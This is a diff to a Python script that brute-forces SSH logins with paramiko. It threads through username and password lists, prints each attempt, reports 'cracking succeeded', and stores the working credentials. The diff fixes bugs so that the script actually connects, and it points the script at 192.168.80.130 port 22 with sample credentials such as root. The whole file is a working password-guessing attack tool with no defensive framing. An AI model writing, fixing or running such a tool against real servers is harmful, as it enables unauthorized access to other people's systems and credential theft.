@@ -1,6 +1,5 @@
 #! -*- coding:utf-8 -*-
-import socket
-import time
+
 import threading
 import paramiko
 result={}
@@ -10,23 +9,23 @@ lock = threading.Lock()
 def test(username,password,ip,port):
     global flag
     global count
+    # port=int(port)
     for user in username:
         for passwd in password:
+
             if flag==True:
                 return
             lock.acquire()
             count+=1
             lock.release()
             try:
-                ssh = paramiko.SSHClient()
-                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                # t = paramiko.Transport(ip, port)
+
                 lock.acquire()
                 print('\n 正在尝试：用户名：%s 密码：%s\n' % (user, passwd))
                 lock.release()
-                ssh.connect(ip,port,user, pwsswd)
-                time.sleep(0.05)
-                t.close()
+                ssh = paramiko.SSHClient()
+                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                ssh.connect(ip, port, user, passwd)
                 lock.acquire()
                 flag=True
                 result['usernmae']=user
@@ -36,6 +35,7 @@ def test(username,password,ip,port):
                 print('\n[+] 破解成功，用户名：%s 密码：%s\n' % (user, passwd))
                 return
             except:
+
                 pass
 
 
@@ -65,7 +65,7 @@ def brute(thread_num,ip,port):
             result['count']=count
 
 if __name__ == '__main__':
-    brute(4,'192.168.80.130',22)
+    test(['root','user'], ['134','12345678'], '192.168.80.130', '22')
     print(result)
 
 
